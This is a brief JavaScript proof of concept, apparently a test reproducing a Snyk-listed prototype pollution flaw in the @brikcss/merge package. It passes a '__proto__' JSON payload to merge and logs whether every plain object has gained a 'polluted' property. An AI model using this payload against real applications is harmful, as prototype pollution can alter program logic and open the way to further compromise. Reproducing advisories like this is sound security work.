// //https://security.snyk.io/vuln/SNYK-JS-BRIKCSSMERGE-1727594
// test("prototype pollution in @brikcss/merge", () => {
  const merge = require("@brikcss/merge");
  let obj = {};
  // let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);

  merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);
// });
